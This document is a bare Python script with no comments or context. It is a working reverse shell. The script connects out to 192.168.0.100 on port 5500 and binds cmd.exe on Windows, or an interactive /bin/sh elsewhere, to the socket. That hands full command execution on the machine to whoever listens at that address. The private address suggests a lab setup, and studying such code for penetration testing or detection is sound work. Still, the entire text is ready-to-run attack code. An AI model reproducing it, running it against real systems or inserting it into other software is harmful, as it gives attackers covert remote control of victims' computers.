import socket
import subprocess
import os
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.0.100", 5500))

if os.name == "nt":
    subprocess.Popen(["cmd.exe"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno(), shell=True)
else:
    subprocess.Popen(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno(), shell=True)